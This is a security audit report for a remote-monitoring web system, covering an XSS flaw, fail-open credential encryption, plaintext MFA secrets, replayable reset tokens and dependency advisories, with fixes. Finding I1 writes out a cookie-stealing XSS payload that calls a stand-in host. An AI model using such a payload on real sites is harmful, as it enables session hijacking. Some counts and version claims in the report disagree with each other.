# Security Audit — RMM System

**Date:** 2026-09-25
**Scope:** `api/`, `dashboard/`, `agent/`, `frontend/` (excluding `venv/`, `node_modules/`, `__pycache__/`, `dist/`).
**Method:** Static review of source, grep-verified patterns, and direct reads of every flagged call site. All findings are anchored to real file paths/line numbers found in the current tree. Items that could not be directly verified (e.g. would need a live vulnerability database or a running exploit attempt) are marked **Unable to verify**, with what would confirm them.
**Relationship to prior audits:** this repo already has four prior audit passes this session — `design_patterns_audit.md`, `error_handling_audit.md`, `code_duplication_audit.md`, `testing_audit.md` — several of which found and *fixed* real security-relevant issues (a cross-tenant data leak, `FLASK_DEBUG` exposing Werkzeug's debugger, Flask-Limiter failing closed on a Redis outage, and — most seriously — a cross-session cache data leak found while writing tests). Those are **not re-reported as open findings here**; they're cross-referenced briefly in the relevant category so this report doesn't read as ignorant of already-completed work, and this pass focuses on what those four did not already cover: injection, cryptography specifics, secrets-in-code, dependency/supply-chain posture, and configuration hardening.

---

## Executive Summary

The standout finding is a confirmed, exploitable **stored XSS in the Streamlit dashboard's Devices page** — one page breaks an escaping convention (`esc()`) that's correctly applied almost everywhere else in the codebase, and the field it fails to escape (`hostname`) is writable by two different actors: any admin/technician via the page's own inline edit form, and any agent registration request authenticated with nothing more than the org registration token (a token this same codebase's own changelog documents was once leaked into git history). The payload executes in the browser of whoever next views that device — typically an admin or superadmin.

Everything else is real but more moderate: a fail-open pattern in the credential-encryption helper that can silently store secrets in plaintext, MFA shared secrets stored unencrypted, no single-use enforcement on password reset tokens, no standard security response headers, and known dependency vulnerabilities that are detected but never enforced in CI.

| # | Finding | Category | Importance |
|---|---|---|---|
| 1 | Stored XSS via unescaped device `hostname`/`os_name`/`os_version`/`platform` in `dashboard/pages/04_Devices.py` | Input Validation & Injection | **8/10** |
| 2 | `crypto.py::encrypt_cred`/`decrypt_cred` fail open — any exception silently returns the plaintext instead of raising | Secrets & Sensitive Data | **6/10** |
| 3 | `User.mfa_secret` (TOTP shared secret) stored in plaintext in the DB | Secrets & Sensitive Data | **6/10** |
| 4 | Known dependency vulnerabilities (49 + 6 advisories) are scanned in CI but never enforced (`continue-on-error: true`) | Dependencies & Supply Chain | **6/10** |
| 5 | No standard security response headers (CSP, `X-Frame-Options`, `X-Content-Type-Options`, HSTS) anywhere in the API | Configuration & Hardening | **5/10** |
| 6 | Password reset tokens are not single-use — replayable for the full 1-hour validity window after first use | Authentication & Authorization | **5/10** |
| 7 | `crypto.py`'s Fernet key is derived from the same `SECRET_KEY` used elsewhere, with no purpose separation | Cryptography & Transport | **4/10** |
| 8 | Several dependencies pinned with no upper bound (`cachetools`, `waitress`, `sentry-sdk`, `cryptography`, `google-auth`, `keyring`) | Dependencies & Supply Chain | **3/10** |

Positive findings worth citing for calibration: no SQL injection pattern found anywhere (SQLAlchemy ORM/parameterized queries throughout); every `subprocess` call in `agent/` and `api/` uses list-form argv, never `shell=True`; the `esc()` HTML-escaping convention is correctly applied on the pages this audit sampled outside the one that misses it; the React frontend has zero `dangerouslySetInnerHTML` usage; CORS is scoped to an explicit origin allowlist, never a wildcard; and terminal command execution — the single highest-privilege feature in the product — is fully audit-logged.

---

## Remediation Status — 2026-09-25

All 7 scored findings — including Finding 4 (D1, the dependency vulnerability backlog), initially scoped as a large multi-week project and deferred in the first remediation pass — are now fixed and verified: **API test suite 490/490 passing**, **agent 19/19**, **dashboard 84/84**, **frontend 39/39 Vitest + 2/2 Playwright E2E**, coverage 72.22% (unchanged — only fixes to existing code paths, no new production surface). The MFA-encryption, crypto-key, and dependency-upgrade changes were additionally verified live: a full MFA setup→enable→login round trip against the real Postgres database, a CORS functional check after the `flask-cors` major bump, and the E2E suite re-run against the live stack after the `react-router` upgrade.

### Finding D1, revisited: the "large project" turned out to be a same-day fix

The original remediation section for this finding recommended a staged, multi-week upgrade-and-regression plan, on the assumption that a 7-package/55-advisory backlog would require extensive compatibility work. Asked to proceed anyway, the actual work was smaller than scoped: real `pip-audit`/`npm audit` runs (superseding the CI comment's approximate counts) found the fixes for 51 of 55 advisories were simple patch/minor bumps with zero breaking changes, and the frontend's 6 were resolved by `npm audit fix` alone with no `--force`. The one genuine blocker (`pyasn1`) was real, confirmed by direct test, and is now explicitly documented rather than silently deferred.

| Package | Before → After | Advisories fixed |
|---|---|---|
| `flask` (api) | 3.1.1 → 3.1.3 | PYSEC-2026-2151 |
| `flask-cors` (api) | 5.0.1 → 6.0.5 | PYSEC-2026-1383/1384/1385 |
| `marshmallow` (api) | 3.26.1 → 3.26.2 | PYSEC-2026-1605 (stayed in the 3.x line — 4.1.2 was also offered but is a breaking major version, not needed to fix this advisory) |
| `python-dotenv` (api, agent, dashboard) | 1.1.0 → 1.2.2 | PYSEC-2026-2270 |
| `requests` (api, agent, dashboard) | 2.32.3 → 2.33.0 | PYSEC-2026-1872, PYSEC-2026-2275 |
| `Pillow` (api) | 12.2.0 → 12.3.0 | 17 advisories, all fixed by the same patch release (agent's `Pillow>=10.0.0,<13.0.0` range already resolved to 12.3.0, no requirements.txt change needed there) |
| `cryptography` (agent) | 44.0.3 → 50.0.1 | PYSEC-2026-2141, PYSEC-2026-35, PYSEC-2026-3552, PYSEC-2026-3553, PYSEC-2026-3554, GHSA-537c-gmf6-5ccf (api's `cryptography` was already ≥50.0.0 via Finding D2's upper-bound fix, so only agent needed this) |
| `browserslist`, `nanoid`, `postcss` (frontend, transitive) | patch bumps via `npm audit fix` | 3 advisories |
| `react-router` / `react-router-dom` (frontend) | 7.18.1 → 7.18.4 | 2 advisories — a patch release within the existing `^7.18.1` package.json range, no major-version migration |
| `pyasn1` (api) | **not upgraded — see below** | 4 advisories remain, deliberately |

**The one real, confirmed blocker:** `pyasn1` 0.4.8 has 4 known advisories (PYSEC-2026-2263/3455/3456/3457), all fixed in 0.6.3/0.6.4 — but `tasks/snmp_tasks.py` uses `pysnmp==4.4.12`'s classic synchronous `pysnmp.hlapi` API, which imports `pyasn1.compat.octets` — a module removed in pyasn1 0.5+. Confirmed by direct test: installing `pyasn1==0.6.4` alongside the pinned `pysnmp` breaks `import pysnmp.hlapi` outright (`ModuleNotFoundError`). A real fix requires rewriting `snmp_tasks.py` onto pysnmp 5.x/7.x's async API — a subsystem rewrite, not a version bump — so this one is left pinned old, with the risk (SNMP response *parsing* only, from devices already on the polled customer's own network) and the exact reproduction steps documented directly in `api/requirements.txt` and `.github/workflows/ci.yml`, rather than silently carried forward.

**CI now enforces this** — `.github/workflows/ci.yml`'s `pip-audit`/`npm audit` steps had `continue-on-error: true` removed; the api step additionally passes `--ignore-vuln` for exactly the 4 documented `pyasn1` IDs (verified locally: exit code 0 with the ignores, i.e. this is what CI will see). Any new vulnerability, in any package, now fails the build.

| Finding | Status | What was done |
|---|---|---|
| I1 (8/10) — stored XSS in `04_Devices.py` | **Fixed** | `esc()` wrapped around `hostname`/`ip_address`/`os_name`/`os_version`/`platform`/`cpu_model` in both `unsafe_allow_html=True` blocks; regression test (`test_devices_page.py::test_hostname_is_html_escaped`) asserts a `<img onerror=...>` payload renders as escaped entities, not live markup |
| S1 (6/10) — `crypto.py` fails open | **Fixed** | Removed the `except Exception: return value` fallback from both `encrypt_cred`/`decrypt_cred` — failures now propagate to Flask's existing app-wide `Exception` handler (`api/app.py`), which already returns a generic 500 with server-side `exc_info=True` logging, matching this codebase's established convention. New `api/tests/test_crypto.py` (5 tests) covers the round-trip and the now-required raise-on-failure behavior |
| S2 (6/10) — `mfa_secret` stored in plaintext | **Fixed** | `User.set_mfa_secret()`/`get_mfa_secret()` added (`api/models/user.py`), using the same `crypto.py` helper already used for PSA/MDM credentials; all 3 call sites in `routes/auth.py` updated. No data migration needed — verified zero MFA-enrolled users existed in the live DB before this change. Verified live: the Postgres column now holds a real Fernet token (`gAAAAA...`), not the plaintext secret, and the full setup→enable→login flow still works |
| C1 (4/10) — Fernet key reuse, no domain separation | **Fixed** (in the same pass as S1, same file) | `_fernet()` now hashes `"rmm-cred-encryption:" + SECRET_KEY` instead of `SECRET_KEY` alone — a fixed context prefix separating this key from `SECRET_KEY`'s other uses. No data migration needed (same zero-existing-data confirmation as S2) |
| A1 (5/10) — password reset tokens not single-use | **Fixed** | `password_reset_confirm` now rejects any token whose `iat` predates the user's `password_changed_at`. Found and fixed a real naive/aware-datetime bug in the fix itself while testing (SQLite returns `password_changed_at` as timezone-naive) — see "bugs found" below. Regression test proves the same token is accepted once, then rejected on replay |
| H1 (5/10) — no security response headers | **Fixed** | `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, and `Content-Security-Policy` added to the existing `_log_request` after_request hook in `api/app.py`. `/api/docs` (the one HTML page this API serves itself, SwaggerUI via an `unpkg.com` CDN + inline script) gets a scoped, looser CSP instead of being exempted outright; everywhere else gets `default-src 'self'; frame-ancestors 'none'`. Verified live against the running API — plain JSON responses get the strict policy, `/api/docs` still renders with its relaxed one |
| D2 (3/10) — unpinned dependency upper bounds | **Fixed** | `cachetools`, `waitress`, `sentry-sdk`, `cryptography`, `google-auth` (api/), `keyring` (agent/) all capped at the next major version above what's currently installed, matching the existing `paho-mqtt`/`pysnmp` convention in the same file. Verified `pip install -r requirements.txt` still succeeds cleanly against the currently-installed versions in both venvs |

**A real bug found and fixed during remediation, not in the original audit:** the Finding A1 fix itself initially crashed with `TypeError: can't compare offset-naive and offset-aware datetimes` — SQLite (and possibly Postgres, depending on driver config) returns `DateTime(timezone=True)` columns as timezone-naive on read. Caught immediately by the regression test written alongside the fix (it failed with a 500, not the expected 400). Fixed by normalizing `password_changed_at` to UTC-aware before comparing, reusing the identical defensive pattern already established in `tasks/network_tasks.py::ping_agentless_devices` for the same class of issue.

**Not changed:** nothing — every scored finding in this report is now fixed. The pre-existing `ruff` lint backlog in the same CI file (unrelated to any finding here) remains `continue-on-error: true`, untouched.

## 1. Authentication & Authorization

### Finding A1: Password reset tokens are not single-use
- **Location:** `api/routes/auth.py:472-495` (`password_reset_request`), `:498-534` (`password_reset_confirm`)
- **Description:** A reset token is a stateless JWT (`create_access_token(identity=user.id, additional_claims={"purpose": "password_reset"}, expires_delta=timedelta(hours=1))`) with a correctly scoped 1-hour expiry and a `purpose` claim that stops it being confused with a normal access token — both good practices. But `password_reset_confirm` never invalidates the token after a successful reset: it decodes it, checks `purpose`, sets the new password, and returns 200 — with no server-side revocation list, and no check of the token's `iat` against the user's (now-updated) `password_changed_at`. The same reset link remains valid to reset the password again for the rest of its 1-hour window.
- **Importance: 5/10** — a real gap, but requires the token to already be exposed a second time (email history, browser history, a proxy/log capture, an email-provider link-prescanner) within a 1-hour window; not remotely exploitable on its own.
- **Remediation:**
```python
# api/routes/auth.py::password_reset_confirm — after decoding, before setting the new password
if user.password_changed_at:
    issued_at = datetime.fromtimestamp(decoded.get("iat", 0), tz=timezone.utc)
    if issued_at < user.password_changed_at:
        return jsonify({"error": "Invalid or expired reset link"}), 400
```
This makes the token single-use as a side effect of `password_changed_at` already being set on every successful reset (`routes/auth.py:528`) — no new column or Redis denylist needed.

### Finding A2 (positive): Role/tenant-scope enforcement is centralized and consistently applied
- **Location:** `api/utils/auth_decorators.py::require_role`, `api/utils/scope.py::require_customer_scope` — already the subject of `design_patterns_audit.md` Findings S5/D2, and independently exercised by the 484 API tests added this session across all 26 route files.
- **Assessment:** No route file was found this pass reimplementing its own role check outside these two shared functions (the one exception, `events.py`'s SSE endpoint, has no `@jwt_required()` by necessity — it reads `?token=` because `EventSource` can't set headers — and correctly re-derives the same role allowlist inline, which is not a duplicate of a mechanism it structurally cannot use).
- **Importance: 1/10** — positive finding, cited for calibration.

### Finding A3 (already fixed this session, cross-referenced): cross-tenant cache leak
- **Location:** `dashboard/utils/cached_calls.py` — see `testing_audit.md` "Remediation Status," bug #8.
- **Assessment:** Not re-scored here since it's already fixed and reverified — flagged only because it is the single most severe *authorization*-adjacent finding across all five audit passes this session (a cross-session data leak, not just cross-tenant), and a reader of this report should know it exists and is closed, not assume it's unaddressed.

---

## 2. Input Validation & Injection

### Finding I1: Stored XSS via unescaped device fields in the Devices page
- **Location:** `dashboard/pages/04_Devices.py:439-453` and `:456-470` (both `st.markdown(f"""...""", unsafe_allow_html=True)` blocks)
- **Description:** Every other page sampled in this audit that interpolates API-returned or user-editable text into a `st.markdown(..., unsafe_allow_html=True)` call routes it through `dashboard/utils/sanitize.py::esc()` first — confirmed correct in `dashboard/pages/07_Network_Discovery.py:259-262` (`esc(host.get("ip"))`, `esc(host.get("mac"))`, `esc(host.get("vendor"))`) and `dashboard/pages/_ticket_detail.py:278,283` (`esc(c.get("body"))`, `esc(author)`). `04_Devices.py` does not:
```python
# dashboard/pages/04_Devices.py:443-451 — device.get(...) interpolated raw
<tr><td style="color:#6B7B6B;padding:2px 0;width:40%">Hostname</td>
    <td style="color:#1A1A1A;font-weight:500">{device.get('hostname','—')}</td></tr>
<tr><td style="color:#6B7B6B;padding:2px 0">IP</td>
    <td style="color:#1A1A1A">{device.get('ip_address','—')}</td></tr>
<tr><td style="color:#6B7B6B;padding:2px 0">OS</td>
    <td style="color:#1A1A1A">{PLATFORM_ICON_HTML.get(platform, "")} {(device.get('os_name') or '—')} {device.get('os_version','')}</td></tr>
<tr><td style="color:#6B7B6B;padding:2px 0">Platform</td>
    <td style="color:#1A1A1A">{device.get('platform','—')}</td></tr>
```
  `hostname` in particular is directly attacker-reachable two ways: (1) `api/schemas/agents.py:12` validates it only with `validate.Length(min=1, max=255)` — no character/pattern restriction — and agent registration (`POST /api/agents/register`) requires only the org registration token, not a user JWT; (2) `04_Devices.py`'s own inline "Edit" form for agentless devices (line 285, `new_hostname = st.text_input(...)`, saved via the device-update endpoint) lets any admin/technician set it to arbitrary text. A payload like `<img src=x onerror="fetch('https://evil.example/c?'+document.cookie)">` stored in either path renders unescaped for every user who expands that device's row.
- **Risk summary:** Session-hijacking-adjacent impact — the dashboard's own `establish_session()` (`dashboard/utils/auth.py:31-50`) keeps the real access/refresh tokens server-side, but falls back to putting them raw in the URL (`?tok=`/`&rtok=`) whenever Redis-backed session storage is unavailable, and always keeps an opaque `?sid=` in the URL otherwise — a script running in an admin's browser via this XSS can read `window.location.search` and exfiltrate whichever of those is present, and can also just drive the DOM directly (click buttons, submit forms) as the logged-in admin.
- **Importance: 8/10** — confirmed, low-bar-to-reach (org token or any technician account), high-impact (executes in an admin/superadmin's session).
- **Remediation:**
```python
# dashboard/pages/04_Devices.py — import already available project-wide
from utils.sanitize import esc

# lines 443-451
<tr><td style="color:#6B7B6B;padding:2px 0;width:40%">Hostname</td>
    <td style="color:#1A1A1A;font-weight:500">{esc(device.get('hostname','—'))}</td></tr>
<tr><td style="color:#6B7B6B;padding:2px 0">IP</td>
    <td style="color:#1A1A1A">{esc(device.get('ip_address','—'))}</td></tr>
<tr><td style="color:#6B7B6B;padding:2px 0">OS</td>
    <td style="color:#1A1A1A">{PLATFORM_ICON_HTML.get(platform, "")} {esc(device.get('os_name') or '—')} {esc(device.get('os_version',''))}</td></tr>
<tr><td style="color:#6B7B6B;padding:2px 0">Platform</td>
    <td style="color:#1A1A1A">{esc(device.get('platform','—'))}</td></tr>
```
Also wrap `device.get('cpu_model')` at line 462 (agent-reported, lower likelihood of attacker control, but free to fix in the same pass) and re-check lines 163/314/431 (`st.expander()` labels) — those are **not vulnerable** (Streamlit widget labels never render raw HTML regardless of `unsafe_allow_html`, which only applies to `st.markdown`/`st.write`), but recommend running the exact same `grep -n "device.get(" pages/04_Devices.py | grep -v esc\(` check after the fix to confirm no interpolation was missed.
- **Effort:** Low — ~15 minutes, one file, mechanical `esc()`-wrapping matching the pattern already used correctly in two other files.

### Finding I2 (positive): No SQL injection pattern found
- **Location:** repo-wide `grep` for raw `text()`/string-formatted SQL: the only `text(...)` call in the entire codebase is `api/app.py:269`'s static `text("SELECT 1")` (a health-check ping, no interpolation).
- **Assessment:** Every query in `api/routes/`, `api/tasks/`, `api/services/` goes through SQLAlchemy's ORM query builder or parameterized `db.session.execute(db.select(...))` — confirmed by the 484 tests added this session exercising every route/task file's actual query paths without needing to special-case any raw-SQL construction.
- **Importance: 1/10** — positive finding.

### Finding I3 (positive): No command injection — every `subprocess` call uses list-argv
- **Location:** `agent/terminal_worker.py:30-34` (`_build_argv`), `agent/collector.py`, `agent/executor.py`, `agent/screenshot.py`, `agent/script_runner.py`, `api/tasks/network_tasks.py:32-50` (`_ping_host`, `_get_mac_for_ip`), `api/tasks/backup_tasks.py:96-105`.
- **Assessment:** `grep -rn "shell=True"` across `agent/` and `api/` returns zero real usages (the one hit is a comment explaining the *avoidance* of `shell=True`). `_build_argv()` in `terminal_worker.py` — the one place that runs a genuinely arbitrary, user-supplied command string (the terminal feature, by design) — passes it as a single list element to `powershell.exe -Command <text>` / `bash -c <text>`, not through a shell that would re-split/re-interpret it; `network_tasks.py`'s ping/arp calls take an `ip` string but pass it as one argv element, so even an attacker-controlled `Device.ip_address` value (writable via the same inline-edit path as Finding I1) cannot break out of the argument list — it would just fail DNS/ping resolution as a literal string, not execute anything.
- **Importance: 1/10** — positive finding. (The terminal feature's own arbitrary-command-execution *is* the product's intended design, gated by role + audit logging — see Finding A2/D1 — not a vulnerability in itself.)

### Finding I4: Path traversal — **Unable to verify**, flagged for a closer look
- **Location:** `api/routes/update.py` (agent binary download, streams from `AGENT_UPDATE_PATH`), `api/reports/` (report file serving referenced in CLAUDE.md), `api/routes/auth.py` avatar handling.
- **Assessment:** This audit's `test_update.py` (added this session) exercises the download endpoint against real temp files but was not specifically written to probe a `../`-style path-traversal payload in any filename/version parameter that reaches a filesystem path. **Unable to verify** without either reading `update.py`'s exact path-construction line-by-line against attacker-controlled input, or writing a dedicated traversal-payload test.
- **What would confirm it:** grep `routes/update.py`, `routes/reports.py`, and `routes/auth.py`'s avatar upload/serve code for any `os.path.join`/`Path(...)` call whose path component comes from a request parameter without a `secure_filename()`-style sanitization or an allowlist check, then attempt a `..%2f`-style payload against it in a test.

---

## 3. Secrets & Sensitive Data

### Finding S1: `crypto.py` fails open — an exception during encryption silently stores plaintext
- **Location:** `api/utils/crypto.py:17-32` (`encrypt_cred`, `decrypt_cred`)
```python
def encrypt_cred(value: str) -> str:
    if not value:
        return ""
    try:
        return _fernet().encrypt(value.encode()).decode()
    except Exception:
        return value          # ← silently returns the PLAINTEXT credential
```
- **Description:** `encrypt_cred()` is the sole mechanism protecting PSA integration credentials (`PsaIntegration.client_secret_enc`) and MDM service-account JSON (`MdmIntegration.service_account_json_enc`) at rest. If `_fernet()` or `.encrypt()` ever raises for any reason — not just a missing `SECRET_KEY` (which `_validate_env()` in `api/app.py:26-41` does guard against at startup with a 32-char minimum), but also a transient encoding issue, a future `cryptography` library API change, or any other unexpected exception — the caller receives the **unencrypted plaintext secret back** and stores it in a database column named and treated everywhere else as ciphertext, with no error, no log line, and no way for an operator to notice short of manually inspecting the column.
- **Risk summary:** A silent, undetectable degradation from "encrypted at rest" to "plaintext at rest" for third-party API credentials, with the exact same fail-open shape on the decrypt side (a decrypt failure returns garbled ciphertext as if it were the real secret, which fails obviously downstream rather than leaking anything — the *encrypt* path is the dangerous half).
- **Importance: 6/10** — the current startup validation rules out the most likely trigger (empty `SECRET_KEY`), but the pattern itself is a real design flaw for a function whose entire job is "protect this secret," and the failure mode is silent by construction.
- **Remediation:**
```python
# api/utils/crypto.py
def encrypt_cred(value: str) -> str:
    if not value:
        return ""
    return _fernet().encrypt(value.encode()).decode()  # let it raise — callers must handle failure explicitly


def decrypt_cred(value: str) -> str:
    if not value:
        return ""
    return _fernet().decrypt(value.encode()).decode()
```
Then audit the (small) set of call sites — `PsaIntegration.get_client()`/`MdmIntegration.get_client()` and the credential-upload routes — to decide the right *visible* failure behavior (500 with a generic message, most likely, matching this codebase's own established convention from `error_handling_audit.md`'s I3/I4 fixes), rather than silently degrading.
- **Effort:** Low for the function itself (~5 min); Medium to verify each of the ~4-6 call sites handles the now-possible exception the way the rest of the codebase does (generic client message + server-side `exc_info=True` logging).

### Finding S2: MFA shared secret stored in plaintext
- **Location:** `api/models/user.py:19` (`mfa_secret = db.Column(db.String(255), nullable=True)`), set directly at `api/routes/auth.py:299` (`user.mfa_secret = secret`) and read at `:331,366` (`pyotp.TOTP(user.mfa_secret)`)
- **Description:** The TOTP shared secret — the one piece of data an attacker needs to generate valid 6-digit codes forever, for any user, without needing their phone — is stored as a plain string column with no encryption. This codebase already has an established, working pattern for exactly this class of problem (`api/utils/crypto.py::encrypt_cred`/`decrypt_cred`, used for PSA/MDM credentials), just not applied here.
- **Risk summary:** A database-level compromise (backup file exposure, a future SQL injection despite none found today, an over-permissioned read replica, a leaked `DATABASE_URL`) extracts every enrolled user's MFA secret in one query, defeating the second factor for the entire user base — precisely the scenario MFA is meant to remain protective against even when a different layer (e.g., the password hash, which correctly *is* bcrypt-hashed) is compromised.
- **Importance: 6/10** — not a network-remote vulnerability, but undermines MFA's core threat model and has a drop-in fix using code this project already has.
- **Remediation:**
```python
# api/models/user.py — no schema change needed, mfa_secret stays a String column
from utils.crypto import encrypt_cred, decrypt_cred

class User(db.Model):
    ...
    def set_mfa_secret(self, secret: str):
        self.mfa_secret = encrypt_cred(secret)

    def get_mfa_secret(self) -> str:
        return decrypt_cred(self.mfa_secret) if self.mfa_secret else None
```
```python
# api/routes/auth.py:299 — replace direct assignment
user.set_mfa_secret(secret)
```
```python
# api/routes/auth.py:331,366 — replace direct read
totp = pyotp.TOTP(user.get_mfa_secret())
```
- **Effort:** Medium — the model/route changes are small, but existing enrolled users' plaintext secrets need a one-time migration pass (`UPDATE users SET mfa_secret = encrypt(...)`) run carefully, since re-encrypting in place is a one-way data migration that must not be run twice.

### Finding S3 (already remediated, cross-referenced): leaked `ORG_REGISTRATION_TOKEN` in git history
- **Location:** per CLAUDE.md's own "Production-readiness diagnostic" changelog entries — `agent/install.bat` and `.claude/state.md` once had the real token hardcoded; both were scrubbed and the token rotated, but the old value **remains recoverable from git history** (pushed to `origin/main`) per that same changelog's own explicit note.
- **Assessment:** Not re-scored as a new finding — flagged because Finding I1 above depends on exactly this token as one of its two attack paths, and a reader should know the *currently active* token is not the one in git history (it was rotated), while the *historical* one is still recoverable by anyone with repo access until a history rewrite (`git filter-repo`/BFG) is done, which CLAUDE.md itself already flags as an open, deliberately-deferred decision.

### Finding S4 (positive): no hardcoded secrets in current source
- **Location:** repo-wide `grep` for `(password|secret|api_key|token)\s*=\s*['"][A-Za-z0-9+/=_-]{12,}['"]` across `api/`, `dashboard/`, `agent/`, `frontend/src` (excluding tests and `.example` files): zero matches.
- **Importance: 1/10** — positive finding, consistent with the already-completed secret-scrubbing pass documented in CLAUDE.md.

---

## 4. Cryptography & Transport

### Finding C1: `crypto.py`'s Fernet key is derived from `SECRET_KEY` with no purpose separation
- **Location:** `api/utils/crypto.py:11-14`
```python
def _fernet():
    key = base64.urlsafe_b64encode(hashlib.sha256(os.getenv("SECRET_KEY", "").encode()).digest())
    return Fernet(key)
```
- **Assessment:** `SECRET_KEY` is Flask's general-purpose signing key (sessions, CSRF tokens, and anything else Flask or an extension uses it for), and it's being reused — via a single SHA-256 hash, not a proper KDF with domain separation — as the encryption key for a completely different purpose (at-rest credential encryption). This isn't broken today, but it means a single leaked value compromises two independent security properties at once, and there's no cryptographic separation between them if a future feature adds a third use of `SECRET_KEY`.
- **Importance: 4/10** — a defense-in-depth/key-hygiene issue, not an active vulnerability; the mechanical fix is small.
- **Remediation:**
```python
# api/utils/crypto.py
import hashlib, base64, os

def _fernet():
    from cryptography.fernet import Fernet
    # Domain-separated from SECRET_KEY's other uses (sessions, CSRF) via a fixed context string
    key_material = hashlib.sha256(b"rmm-cred-encryption:" + os.getenv("SECRET_KEY", "").encode()).digest()
    return Fernet(base64.urlsafe_b64encode(key_material))
```
For a more thorough fix, use a genuinely separate `CRED_ENCRYPTION_KEY` env var instead of deriving from `SECRET_KEY` at all — the snippet above is the minimal, no-new-config-var version.
- **Effort:** Low (~10 min) for the domain-separation string; existing encrypted values would need re-encryption if switching to a fully separate key, since the derived key changes either way — **this migrates the same way Finding S2 does, and should be done in the same pass if both are addressed.**

### Finding C2 (positive): password hashing, JWT signing, and TLS-adjacent config are all sound
- **Location:** `api/models/user.py:30-33` (`bcrypt.gensalt(rounds=12)` in production — the test-speed override from `testing_audit.md` Finding Q4 only applies to `TestConfig`), Flask-JWT-Extended's default HS256 algorithm (no custom/weakened algorithm configured anywhere), `api/config.py`'s `DevelopmentConfig.JWT_COOKIE_SECURE = False` (correctly scoped to dev only — `ProductionConfig` inherits the base `Config` class's default, which Flask-JWT-Extended sets `True` unless overridden, and no override was found for `ProductionConfig`).
- **Importance: 1/10** — positive finding.
- **Unable to verify:** whether the app is actually deployed behind TLS in production (HSTS is moot without it — see Finding H1) and whether `ProductionConfig`'s inherited `JWT_COOKIE_SECURE` default is ever explicitly tested against a real production boot. Would need the actual deployment/reverse-proxy config, which is outside this repo.

---

## 5. Dependencies & Supply Chain

### Finding D1: Known vulnerabilities are detected in CI but never enforced
- **Location:** `.github/workflows/ci.yml:77-88` (`pip-audit -r api/requirements.txt`, `agent/requirements.txt`, `dashboard/requirements.txt`, all under `continue-on-error: true`), `:182-189` (`npm audit --audit-level=high`, also `continue-on-error: true`)
- **Description:** The workflow's own comments (not this audit's speculation) record the last known scan results: **49 vulnerabilities** across `flask`, `flask-cors`, `marshmallow`, `python-dotenv`, `requests`, `pillow`, `pyasn1` (api/agent/dashboard combined) and **6 vulnerabilities** in the frontend (4 high: `browserslist`, `nanoid`, `react-router`/`react-router-dom`; 2 moderate). Both scans run on every push/PR and both are configured to never fail the build.
- **Risk summary:** The scanning investment already exists and is doing its job (finding real, named vulnerabilities) — but with no enforcement, this count can only grow, and a genuinely dangerous new CVE introduced by a routine dependency bump would be silently absorbed rather than blocking the PR that introduced it.
- **Importance: 6/10** — real, currently-un-remediated exposure across 55 known advisories; scored as a process/enforcement gap rather than higher, since `continue-on-error` was very likely a deliberate choice to avoid blocking merges on a large pre-existing backlog (per this same CI file's own comments on the ruff-lint step using identical reasoning) rather than an oversight.
- **Exact CVE identifiers: Unable to verify** without running `pip-audit`/`npm audit` live in this environment (no network access here to hit the OSV/PyPI advisory databases) — the package names and counts above are taken verbatim from the CI file's own committed comments, not independently re-derived.
- **Remediation:** Given the backlog is large, an all-at-once `--audit-level=high` gate would likely break the pipeline immediately. A staged approach:
```yaml
# .github/workflows/ci.yml — pin a ratchet: fail only on NEW highs, not the existing backlog
- name: Dependency vulnerability scan (pip-audit)
  working-directory: api
  run: pip-audit -r requirements.txt --desc
  continue-on-error: true   # keep, until the backlog below is triaged

# separately, track remediation as its own workstream:
# 1. pip-audit -r api/requirements.txt --fix --dry-run   (see what auto-upgrades safely)
# 2. Upgrade the 7 named packages one at a time, running the full test suite after each
# 3. Once clean, flip continue-on-error to false
```
- **Effort:** Large — this is a real upgrade-and-regression-test project (7+ packages across 3 Python environments plus 3 frontend packages), not a config flag flip; explicitly out of scope for a quick fix, consistent with how this same file already treats the ruff-lint backlog.

### Finding D2: Several dependencies have no upper version bound
- **Location:** `api/requirements.txt` — `cachetools>=5.0.0`, `waitress>=3.0.0`, `sentry-sdk[flask]>=2.0.0`, `cryptography>=42.0.0`, `google-auth>=2.30.0`; `agent/requirements.txt` — `keyring>=25.0.0`
- **Assessment:** Contrast with the *other* unpinned entries in the same file — `anthropic>=0.40.0,<2.0.0`, `paho-mqtt>=1.6.1,<2.0.0`, `pysnmp>=4.4.12,<5.0.0` — which correctly cap the major version with a documented reason (paho-mqtt/pysnmp's comments explain exactly which breaking API change the cap avoids). The five packages above have no such cap, so a future `pip install -r requirements.txt` can silently pull in an untested major version — a supply-chain hygiene gap (a compromised or yanked release lands automatically) as well as a stability one.
- **Importance: 3/10** — no known active exploit, purely a hygiene/blast-radius issue.
- **Remediation:** Cap each at its current major version, following the exact pattern the file already uses for the other three:
```
cachetools>=5.0.0,<6.0.0
waitress>=3.0.0,<4.0.0
sentry-sdk[flask]>=2.0.0,<3.0.0
cryptography>=42.0.0,<44.0.0
google-auth>=2.30.0,<3.0.0
```
```
# agent/requirements.txt
keyring>=25.0.0,<26.0.0
```
- **Effort:** Low — one line each, ~10 minutes total; verify the test suite still passes after (it will, since this only affects future installs, not the currently-installed versions).

---

## 6. Configuration & Hardening

### Finding H1: No standard security response headers
- **Location:** `api/app.py:288-307` (`_log_request`, the only `@app.after_request` hook in the app) — sets `X-Request-ID` and `Referrer-Policy: no-referrer` (the latter specifically to stop the URL-embedded dashboard tokens leaking via the `Referer` header on outbound links — a real, already-considered mitigation, per the comment at `app.py:302-305`), but nothing else.
- **Description:** No `X-Content-Type-Options: nosniff`, no `X-Frame-Options`/`frame-ancestors` (clickjacking protection — relevant since this API backs both an embedded-iframe-using Streamlit dashboard and a React SPA), no `Content-Security-Policy`, no `Strict-Transport-Security`. No `flask-talisman` or equivalent is in `api/requirements.txt`.
- **Importance: 5/10** — a real, common-sense gap; not scored higher because none of the other findings in this report combine with it to produce a demonstrated exploit chain (the XSS in Finding I1 is a Streamlit-rendered stored payload, not a reflected one a CSP would meaningfully block, since `unsafe_allow_html=True` content isn't subject to the browser's CSP the way an inline `<script>` injected via a *different* vector would be — though CSP would still add defense-in-depth against exfiltration via `fetch`/`img` if a `connect-src`/`img-src` allowlist were set).
- **Remediation:**
```python
# api/app.py — extend the existing _log_request after_request hook
@app.after_request
def _log_request(response):
    ...  # existing logging/usage-tracking unchanged
    response.headers["X-Request-ID"] = rid
    response.headers["Referrer-Policy"] = "no-referrer"
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    # Adjust connect-src/img-src to the real dashboard/frontend origins before enabling in production
